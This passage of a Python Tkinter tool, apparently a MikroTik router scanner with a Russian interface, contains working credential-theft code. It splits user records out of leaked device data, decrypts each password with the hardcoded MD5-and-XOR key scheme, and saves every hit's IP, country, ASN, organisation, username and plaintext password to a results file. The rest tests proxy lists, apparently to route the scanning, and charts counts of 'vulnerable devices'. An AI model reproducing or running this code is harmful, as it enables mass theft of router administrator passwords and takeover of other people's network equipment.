        self.start_btn.config(state=tk.NORMAL)
        self.pause_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.DISABLED)
        self.update_progress(0, "Сканирование остановлено")
        self.log_queue.put(("=== СКАНИРОВАНИЕ ОСТАНОВЛЕНО ===", "info"))

    def save_successful_result(self, ip, data, geo_info, version):
        user_pass = self.get_pair(data)
        if not user_pass:
            return

        output_file = self.get_full_path("results.txt")
        with open(output_file, "a", encoding='utf-8') as file:
            file.write(f"\n=== Успех: {ip} ===\n")
            file.write(f"Версия: {version}\n")
            file.write(f"Страна: {geo_info['country']}\n")
            file.write(f"ASN: {geo_info['asn']}\n")
            file.write(f"Организация: {geo_info['org']}\n")
            for u, p in user_pass:
                file.write(f"Пользователь: {u}\nПароль: {p}\n")
            file.write("="*30 + "\n")

    def get_pair(self, data):
        user_list = []
        entries = data.split(b"M2")[1:]
        for entry in entries:
            try:
                user, pass_encrypted = self.extract_user_pass_from_entry(entry)
                pass_plain = self.decrypt_password(user, pass_encrypted)
                user = user.decode("utf-8", errors='ignore')
                user_list.append((user, pass_plain))
            except:
                continue
        return user_list

    def extract_user_pass_from_entry(self, entry):
        try:
            user_data = entry.split(b"\x01\x00\x00\x21")[1]
            pass_data = entry.split(b"\x11\x00\x00\x21")[1]
            user_len = user_data[0]
            pass_len = pass_data[0]
            username = user_data[1:1 + user_len]
            password = pass_data[1:1 + pass_len]
            return username, password
        except:
            raise ValueError("Неверный формат данных")

    def decrypt_password(self, user, pass_enc):
        key = hashlib.md5(user + b"283i4jfkai3389").digest()
        passw = ""
        for i in range(len(pass_enc)):
            passw += chr(pass_enc[i] ^ key[i % len(key)])
        return passw.split("\x00")[0]

    def parse_proxy(self, proxy_str):
        protocol = self.proxy_type.get()
        host = port = username = password = ""
        
        if "://" in proxy_str:
            protocol, rest = proxy_str.split("://", 1)
        else:
            rest = proxy_str

        if "@" in rest:
            auth, addr = rest.split("@")
            username, password = auth.split(":")
            host, port = addr.split(":")
        elif rest.count(":") == 3:
            host, port, username, password = rest.split(":")
        else:
            host, port = rest.split(":")

        return {
            'type': protocol,
            'host': f"{host}:{port}",
            'user': username,
            'pass': password
        }

    def test_current_proxy(self):
        proxy = self.proxy_var.get()
        if not proxy or ":" not in proxy:
            self.log_queue.put(("Ошибка: Неверный формат прокси (должен быть ip:port)", "error"))
            return

        proxy_types = ["http", "socks4", "socks5"] if self.proxy_type.get() == "all" else [self.proxy_type.get()]

        for p_type in proxy_types:
            proxy_info = {
                'type': p_type,
                'host': proxy,
                'user': self.proxy_user.get(),
                'pass': self.proxy_pass.get()
            }

            self.log_queue.put((f"\n=== Тестирование прокси {p_type.upper()} ===", "info"))
            self.log_queue.put((f"Адрес: {proxy}", "info"))
            if proxy_info['user']:
                self.log_queue.put((f"Аутентификация: {proxy_info['user']}:[скрыто]", "info"))

            try:
                start_time = time.time()
                test_socket = self.create_socket(proxy_info=proxy_info)
                test_socket.connect(("www.google.com", 80))
                ping = int((time.time() - start_time) * 1000)
                test_socket.close()
                self.log_queue.put((f"Прокси рабочий! Пинг: {ping}мс", "success"))
                self.valid_proxy_timestamps.append(datetime.now())
            except Exception as e:
                self.log_queue.put((f"Ошибка тестирования прокси: {str(e)}", "error"))
                self.invalid_proxy_timestamps.append(datetime.now())
            finally:
                self.log_queue.put(("=== Тестирование прокси завершено ===", "info"))

    def test_proxy_list(self):
        if self.proxy_test_running:
            self.log_queue.put(("Тест прокси уже выполняется", "warning"))
            return

        filename = filedialog.askopenfilename(
            title="Выберите файл со списком прокси",
            filetypes=(("Текстовые файлы", "*.txt"), ("Все файлы", "*.*"))
        )
        if not filename:
            return

        self.proxy_test_running = True
        self.proxy_test_paused = False
        self.proxy_test_cancel = False
        self.test_proxy_list_btn.config(state=tk.DISABLED)
        self.pause_proxy_test_btn.config(state=tk.NORMAL)
        self.cancel_proxy_test_btn.config(state=tk.NORMAL)
        self.log_queue.put((f"\n=== Начато тестирование прокси из файла: {filename} ===", "info"))

        threading.Thread(target=self.proxy_test_worker, args=(filename,), daemon=True).start()

    def proxy_test_worker(self, filename):
        try:
            with open(filename, "r") as f:
                proxies = [line.strip() for line in f if line.strip()]

            total = len(proxies)
            valid_proxies = []
            invalid_proxies = []
            ping_times = []

            for proxy in proxies:
                self.proxy_queue.put(proxy)

            threads = []
            for _ in range(min(self.proxy_threads.get(), total)):
                t = threading.Thread(target=self.test_proxy_worker, args=(ping_times, valid_proxies, invalid_proxies, total), daemon=True)
                t.start()
                threads.append(t)

            for t in threads:
                t.join()

            if valid_proxies:
                with open("valid_proxies.txt", "w") as f:
                    f.write("\n".join(valid_proxies))
            if invalid_proxies:
                with open("invalid_proxies.txt", "w") as f:
                    f.write("\n".join(invalid_proxies))

            self.valid_proxy_count = len(valid_proxies)

            self.log_queue.put(("\n=== Тест прокси завершен ===", "info"))
            self.log_queue.put((f"Всего: {total}", "info"))
            self.log_queue.put((f"Валидные: {len(valid_proxies)}", "success"))
            self.log_queue.put((f"Невалидные: {len(invalid_proxies)}", "error"))
            if ping_times:
                avg_ping = sum(ping_times) / len(ping_times)
                self.log_queue.put((f"Средний пинг: {avg_ping:.1f}мс", "info"))

        except Exception as e:
            self.log_queue.put((f"Ошибка теста прокси: {str(e)}", "error"))
        finally:
            self.proxy_test_running = False
            self.test_proxy_list_btn.config(state=tk.NORMAL)
            self.pause_proxy_test_btn.config(state=tk.DISABLED)
            self.cancel_proxy_test_btn.config(state=tk.DISABLED)
            self.update_proxy_progress(0, "Готов")

    def test_proxy_worker(self, ping_times, valid_proxies, invalid_proxies, total):
        while not self.proxy_queue.empty() and not self.proxy_test_cancel:
            if self.proxy_test_paused:
                time.sleep(0.1)
                continue

            try:
                proxy = self.proxy_queue.get_nowait()
            except:
                break

            proxy_types = ["http", "socks4", "socks5"] if self.proxy_type.get() == "all" else [self.proxy_type.get()]
            is_valid = False

            for p_type in proxy_types:
                try:
                    proxy_info = self.parse_proxy(proxy)
                    proxy_info['type'] = p_type
                    start_time = time.time()
                    test_socket = self.create_socket(proxy_info=proxy_info)
                    test_socket.connect(("www.google.com", 80))
                    ping = int((time.time() - start_time) * 1000)
                    test_socket.close()
                    result_text = f"[ВАЛИДНЫЙ] {p_type.upper()} {proxy} | Пинг: {ping}мс"
                    self.log_queue.put((result_text, "success"))
                    ping_times.append(ping)
                    proxy_str = f"{p_type}://{proxy_info['user']}:{proxy_info['pass']}@{proxy_info['host']}" if proxy_info['user'] else f"{p_type}://{proxy_info['host']}"
                    valid_proxies.append(proxy_str)
                    self.valid_proxy_timestamps.append(datetime.now())
                    is_valid = True
                    break
                except Exception as e:
                    result_text = f"[НЕВАЛИДНЫЙ] {p_type.upper()} {proxy} | Ошибка: {str(e)}"
                    self.log_queue.put((result_text, "error"))

            if not is_valid:
                invalid_proxies.append(proxy)
                self.invalid_proxy_timestamps.append(datetime.now())

            self.update_proxy_progress(
                (len(valid_proxies) + len(invalid_proxies)) / total * 100,
                f"Тестирование прокси: {len(valid_proxies) + len(invalid_proxies)}/{total} | Валидные: {len(valid_proxies)} | Невалидные: {len(invalid_proxies)}"
            )
            self.proxy_queue.task_done()

    def toggle_pause_proxy_test(self):
        self.proxy_test_paused = not self.proxy_test_paused
        self.pause_proxy_test_btn.config(text="Продолжить тест прокси" if self.proxy_test_paused else "Пауза теста прокси")
        status = "Тест прокси приостановлен" if self.proxy_test_paused else "Тест прокси возобновлен"
        self.update_proxy_progress(self.proxy_progress_var.get(), status)
        self.log_queue.put((f"=== {status.upper()} ===", "info"))

    def cancel_proxy_test(self):
        self.proxy_test_cancel = True
        self.proxy_test_paused = False
        self.log_queue.put(("=== ТЕСТ ПРОКСИ ОТМЕНЕН ===", "info"))
        self.update_proxy_progress(0, "Тест прокси отменен")

    def clear_output(self):
        self.output_text.delete(1.0, tk.END)

    def apply_filters(self):
        country = self.country_filter.get()
        asn = self.asn_filter.get()
        self.clear_output()

        for ip in self.successful_ips:
            geo = self.geo_data[ip]
            if (country == "Все" or country in geo['country']) and (asn == "Все" or asn in geo['asn']):
                with open(self.get_full_path("results.txt"), "r", encoding='utf-8') as f:
                    lines = f.readlines()
                    for i, line in enumerate(lines):
                        if ip in line:
                            self.log_message("".join(lines[i:i+7]), "success")

    def show_stats(self):
        stats_window = tk.Toplevel(self.root)
        stats_window.title("Статистика")
        stats_window.minsize(600, 400)

        # Выпадающее меню для выбора формата времени
        time_frame = ttk.Frame(stats_window)
        time_frame.pack(fill=tk.X, padx=10, pady=5)
        ttk.Label(time_frame, text="Группировать по:").pack(side=tk.LEFT)
        time_format_menu = ttk.OptionMenu(time_frame, self.stats_time_format, "day", "day", "hour", command=lambda _: self.update_stats(stats_window))
        time_format_menu.pack(side=tk.LEFT, padx=5)

        # Место для графика
        self.stats_canvas = ttk.Frame(stats_window)
        self.stats_canvas.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Начальное отображение графика
        self.update_stats(stats_window)

    def update_stats(self, stats_window):
        # Очищаем предыдущий график
        for widget in self.stats_canvas.winfo_children():
            widget.destroy()

        # Проверяем, есть ли данные для отображения
        if not any([self.vulnerable_timestamps, self.non_vulnerable_timestamps, self.valid_proxy_timestamps, self.invalid_proxy_timestamps]):
            label = ttk.Label(self.stats_canvas, text="Нет данных для отображения. Выполните сканирование или тест прокси.", foreground="red")
            label.pack(pady=20)
            return

        # Формируем временные метки
        time_format = "%Y-%m-%d" if self.stats_time_format.get() == "day" else "%Y-%m-%d %H:00"
        time_labels = []
        vulnerable_counts = defaultdict(int)
        non_vulnerable_counts = defaultdict(int)
        valid_proxy_counts = defaultdict(int)
        invalid_proxy_counts = defaultdict(int)

        for ts in self.vulnerable_timestamps:
            time_key = ts.strftime(time_format)
            vulnerable_counts[time_key] += 1
            if time_key not in time_labels:
                time_labels.append(time_key)

        for ts in self.non_vulnerable_timestamps:
            time_key = ts.strftime(time_format)
            non_vulnerable_counts[time_key] += 1
            if time_key not in time_labels:
                time_labels.append(time_key)

        for ts in self.valid_proxy_timestamps:
            time_key = ts.strftime(time_format)
            valid_proxy_counts[time_key] += 1
            if time_key not in time_labels:
                time_labels.append(time_key)

        for ts in self.invalid_proxy_timestamps:
            time_key = ts.strftime(time_format)
            invalid_proxy_counts[time_key] += 1
            if time_key not in time_labels:
                time_labels.append(time_key)

        time_labels.sort()

        # Подготовка данных для графика
        x_vulnerable = []
        y_vulnerable = []
        x_non_vulnerable = []
        y_non_vulnerable = []
        x_valid_proxy = []
        y_valid_proxy = []
        x_invalid_proxy = []
        y_invalid_proxy = []

        for time_label in time_labels:
            if time_label in vulnerable_counts:
                x_vulnerable.append(1)  # Уязвимые устройства (+1)
                y_vulnerable.append(vulnerable_counts[time_label])
            if time_label in non_vulnerable_counts:
                x_non_vulnerable.append(-1)  # Неуязвимые устройства (-1)
                y_non_vulnerable.append(non_vulnerable_counts[time_label])
            if time_label in valid_proxy_counts:
                x_valid_proxy.append(1)  # Валидные прокси (+1)
                y_valid_proxy.append(valid_proxy_counts[time_label])
            if time_label in invalid_proxy_counts:
                x_invalid_proxy.append(-1)  # Невалидные прокси (-1)
                y_invalid_proxy.append(invalid_proxy_counts[time_label])

        # Создаём график
        fig, ax = plt.subplots(figsize=(10, 6))

        # Линии
        has_data = False
        if x_vulnerable:
            ax.plot(x_vulnerable, y_vulnerable, color='blue', label='Уязвимые устройства', marker='o')
            has_data = True
        if x_non_vulnerable:
            ax.plot(x_non_vulnerable, y_non_vulnerable, color='darkred', label='Неуязвимые устройства', marker='o')
            has_data = True
        if x_valid_proxy:
            ax.plot(x_valid_proxy, y_valid_proxy, color='green', label='Валидные прокси', marker='o')
            has_data = True
        if x_invalid_proxy:
            ax.plot(x_invalid_proxy, y_invalid_proxy, color='red', label='Невалидные прокси', marker='o')
            has_data = True

        # Настройки графика
        ax.set_xlabel("Статус (1 = Уязвимые/Валид_REVISION_1.0ные, -1 = Неуязвимые/Невалидные)")
        ax.set_ylabel("Количество")
        ax.set_title("Статистика по времени")
        ax.grid(True)
        if has_data:
            ax.legend()
        ax.set_xticks([-1, 1])
        ax.set_xticklabels(["Неуязвимые/Невалидные (-1)", "Уязвимые/Валидные (1)"])

        # Добавляем временные метки как аннотации
        for i, time_label in enumerate(time_labels):
            if time_label in vulnerable_counts:
                ax.annotate(time_label, (1, vulnerable_counts[time_label]), textcoords="offset points", xytext=(0,10), ha='center')
            if time_label in non_vulnerable_counts:
                ax.annotate(time_label, (-1, non_vulnerable_counts[time_label]), textcoords="offset points", xytext=(0,10), ha='center')
            if time_label in valid_proxy_counts:
                ax.annotate(time_label, (1, valid_proxy_counts[time_label]), textcoords="offset points", xytext=(0,-15), ha='center')
            if time_label in invalid_proxy_counts:
                ax.annotate(time_label, (-1, invalid_proxy_counts[time_label]), textcoords="offset points", xytext=(0,-15), ha='center')

        plt.tight_layout()
        plt.savefig('stats.png')
        plt.close()

        # Отображаем график
        img = Image.open("stats.png")
        photo = ImageTk.PhotoImage(img)
        label = ttk.Label(self.stats_canvas, image=photo)
        label.image = photo
        label.pack(fill=tk.BOTH, expand=True)

if __name__ == "__main__":
    root = tk.Tk()
    app = MikroTikScannerGUI(root)
    root.protocol("WM_DELETE_WINDOW", app.quit_application)  # Обрабатываем закрытие окна
    root.mainloop()
